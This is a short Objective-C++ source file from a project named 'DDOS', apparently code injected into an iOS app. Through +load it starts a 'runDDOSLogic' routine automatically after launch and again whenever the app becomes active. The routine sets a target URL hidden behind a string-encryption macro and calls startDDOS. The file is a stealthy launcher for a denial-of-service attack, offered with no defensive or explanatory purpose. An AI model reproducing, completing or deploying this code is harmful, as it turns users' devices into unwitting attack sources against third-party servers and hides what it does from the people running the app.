// file .mm
// Project: DDOS
// Created by @dothanh1110 on 1/2/2025.

#import "DDOS.h"
#import "encrypt.h"
#import <UIKit/UIKit.h> 

#define timer(seconds, block) dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(seconds * NSEC_PER_SEC)), dispatch_get_main_queue(), block)

@interface DDOS : NSObject
+ (void)runDDOSLogic; 
@end

@implementation DDOS
+ (void)load {
    timer(2.0, ^{
        [self runDDOSLogic]; 
    });

    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(appDidBecomeActive:)
                                                 name:UIApplicationDidBecomeActiveNotification
                                               object:nil];
}

+ (void)runDDOSLogic {
    DDOS *ddos = [[DDOS alloc] init];
    [ddos setLink:NSSENCRYPT("https://{url json}")]; 
    [ddos startDDOS];
}

+ (void)appDidBecomeActive:(NSNotification *)notification {
    timer(1.0, ^{
        [self runDDOSLogic];
    });

}

+ (void)dealloc {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:UIApplicationDidBecomeActiveNotification object:nil];
}
@end